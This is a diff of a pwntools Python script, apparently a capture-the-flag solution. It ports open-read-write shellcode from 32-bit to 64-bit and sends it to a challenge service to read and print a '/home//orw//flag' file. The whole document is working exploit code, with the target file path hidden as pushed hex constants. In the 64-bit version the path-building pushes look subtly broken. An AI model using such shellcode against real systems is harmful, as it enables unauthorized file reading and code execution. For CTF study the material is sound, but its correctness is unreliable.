@@ -1,38 +1,43 @@
 from pwn import *
+from IPython import embed
 
-p = remote('csie.ctf.tw', 10124)
+context.arch = 'amd64'
 
-sh = """
-    sub esp, 100
-    xor ecx, ecx
-    xor edx, edx
-    xor eax, eax
-    xor ebx, ebx
-    push ecx
-    push 0x67616c66
-    push 0x2f2f7772
-    push 0x6f2f2f65
-    push 0x6d6f682f
-    mov ebx, esp
-    mov al, 5
-    int 0x80
-    nop
-    mov ebx, eax
-    mov ecx, esp
-    mov edx, 60
-    mov eax, 3
-    int 0x80
-    nop
-    mov ebx, 1
-    mov edx, 60
-    mov eax, 4
-    int 0x80
-    nop
-    add esp, 120
-    ret
-    """
+r = remote('127.0.0.1', 7126)
 
-p.send(asm(sh))
-p.recvuntil('Give me your shellcode:')
 
-print (p.recv(60))
+a = asm("""
+        sub rsp, 100
+        xor rcx, rcx
+        xor rdx, rdx
+        xor rax, rax
+        xor rbx, rbx
+        push rcx
+        push 0x67616c66
+        push 0x2f2f7772
+        push 0x6f2f2f65
+        push 0x6d6f682f
+        mov rdi, rsp
+        mov rax, 2
+        syscall
+        nop
+        mov rdi, rax
+        mov rsi, rsp
+        mov rax, 0
+        syscall
+        nop
+        mov rdi, 1
+        mov rdx, 60
+        mov rax, 1
+        syscall
+        nop
+        add rsp, 120
+        ret
+        """)
+
+#embed()
+raw_input('@')
+r.send(a)
+
+print r.recv(60)
+r.interactive()
